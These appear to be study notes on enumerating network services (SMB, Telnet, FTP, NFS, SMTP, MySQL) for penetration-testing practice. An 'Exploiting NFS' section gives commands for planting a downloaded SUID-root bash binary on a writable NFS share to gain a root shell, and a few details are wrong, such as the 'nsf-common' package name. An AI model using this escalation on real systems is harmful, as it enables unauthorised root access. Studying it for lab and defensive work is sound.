## SMB
- SMB standsfor Server Message Block Protocol.
- It  is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network.
- The SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection.

### Enumerating SMB

We can ran a port scan to find out as much information on the target as possible.
After finding a the ports, we can use a couple of tools to work with it.

we can also use enum4linux:

SNYTAX: enum4linux [options] ip

**TAG**            **FUNCTION**  
-U             get userlist  
-M             get machine list  
-N             get namelist dump (different from -U and-M)  
-S             get sharelist  
-P             get password policy information  
-G             get group and member list
-a             all of the above (full basic enumeration)

We can also use smbclient to connect.

We can use smbmap also.

If we have anonymous login, we can view the system files.

We can view smb files using:
```
smbclient ////IP/SHARE
```

### Telnet
Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.

Telnet sends all messages in clear text and has no specific security mechanisms. Thus, in many applications and services, Telnet has been replaced by SSH in most implementations.

The user connects to the server by using the Telnet protocol, which means entering **"telnet"** into a command prompt. The user then executes commands on the server by using specific Telnet commands in the Telnet prompt. You can connect to a telnet server with the following syntax: **"telnet [ip] \[port]"**


### FTP
File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network.

A typical FTP session operates using two channels:

-   a command (sometimes called the control) channel
-   a data channel.

As their names imply, the command channel is used for transmitting commands as well as replies to those commands, while the data channel is used for transferring data.

FTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.

The FTP server may support either Active or Passive connections, or both. 

-   In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it. 
-   In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it.

This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. If both channels were interlinked, you could only enter commands in between data transfers, which wouldn't be efficient for either large file transfers, or slow internet connections

### NFS
- Network File System  allows to  share directories and files with others over a network.
- By using NFS, users and programs can access files on remote systems almost as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.

### How NFS works
First, the client will request to mount a directory from a remote host on a local directory just the same way it can mount a physical device. The mount service will then act to connect to the relevant mount daemon using RPC.

The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.

If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:

-    The file handle
-    The name of the file to be accessed
-    The user's, user ID
-    The user's group ID  

These are used in determining access rights to the specified file. This is what controls user permissions, I.E read and write of files.  

A computer running Windows Server can act as an NFS file server for other non-Windows client computers. Likewise, NFS allows a Windows-based computer running Windows Server to access files stored on a non-Windows NFS server.

In order to do more enumeration on an NFS server, we are going to need the nfs-common toolkit.
```
sudo apt install nsf-common
```

After identifying the NFS port, we can try to access it by mounting the share on our end.
```
mkdir /mnt/{NFS_NAME}
sudo mount -t nfs IP:SHARE_NAME /mnt/{NFS_NAME}/ -nolock

//explanation
 -t nfs -- type of device to mount is NFS 
-nolock - Specifies not to use NTLM locking
```

After you're done with the NFS drive,  we can unmount it by;
```
sudo umount /mnt/{SHARE_NAME}
```

### Exploiting NFS 
If we can view a home directory of one user from the NFS share,we can actually transfer any of our own binaries and use it for priv esc.

For example, we can transfer a static binary of bash , give it suid permissions for the root user and we can use `bash -p` to spawn a root shell.

We can get the static binary by;
```
wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash

cp bash /mnt/{SHARE_NAME}
sudo chown root:root /mnt/{SHARE_NAME}/bash
sudo chmod +s /mnt/{SHARE_NAME}/bash
```

Then, you can log in as the user and then run `bash -p`.

### SMTP
- Simple Mail Transfer Protocol
- It is utilised to handle the sending of emails.
- In order to support email services, a protocol pair is required, comprising of SMTP and POP/IMAP. Together they allow the user to send outgoing mail and retrieve incoming mail, respectively.

The SMTP server performs three basic functions:

-    It verifies who is sending emails through the SMTP server.
-    It sends the outgoing mail
-    If the outgoing mail can't be delivered it sends the message back to the sender

POP (Post Office Protocol) and IMAP(Internet Message Access Protocol) are both email protocols who are responsible for ther transfer of email between a client and a mail server.

 The main differences is in POP's more simplistic approach of downloading the inbox from the mail server, to the client. Where IMAP will synchronise the current inbox, with new mail on the server, downloading anything new. This means that changes to the inbox made on one computer, over IMAP, will persist if you then synchronise the inbox from another computer. The POP/IMAP server is responsible for fulfiling this process.

### How SMTP works.

Email delivery functions much the same as the physical mail delivery system.
 
The role of the SMTP server in this service, is to act as the sorting office, the email (letter) is picked up and sent to this server, which then directs it to the recipient.

We can simplify this as:

1. The mail user agent, which is either your email client or an external program. connects to the SMTP server of your domain, e.g. smtp.google.com. This initiates the SMTP handshake. This connection works over the SMTP port- which is usually 25. Once these connections have been made and validated, the SMTP session starts.  
The first step in SMTP process is `SMTP handshake`

3. The process of sending mail can now begin. The client first submits the sender, and recipient's email address- the body of the email and any attachments, to the server.  

4. The SMTP server then checks whether the domain name of the recipient and the sender is the same.

5. The SMTP server of the sender will make a connection to the recipient's SMTP server before relaying the email. If the recipient's server can't be accessed, or is not available- the Email gets put into an SMTP queue.  

6. Then, the recipient's SMTP server will verify the incoming email. It does this by checking if the domain and user name have been recognised. The server will then forward the email to the POP or IMAP server.

7. The E-Mail will then show up in the recipient's inbox.


SMTP Server software is readily available on Windows server platforms, with many other variants of SMTP being available to run on Linux.

The default smtp port is `25`

### Enumerating SMTP
- We can use Metasploit module called `smtp_version` which can do enumeration on smtp.
- We can also use other tools such as `smtp-user-enum`

### Mysql 

-  is a relational database management system (RDBMS) based on Structured Query Language (SQL).

#### How Mysql works.

MySQL, as an RDBMS, is made up of the server and utility programs that help in the administration of MySQL databases.

it uses a client-server model.

The server handles all database instructions like creating, editing, and accessing data. It takes and manages these requests and communicates using the MySQL protocol.

MySQL can run on various platforms, whether it's Linux or windows. It is commonly used as a back end database for many prominent websites and forms an essential component of the LAMP stack, which includes: Linux, Apache, MySQL, and PHP.

Its default port is `3306,33060`

To interact with it, you may need to install mysql client.
```
sudo apt install default-mysql-client
```

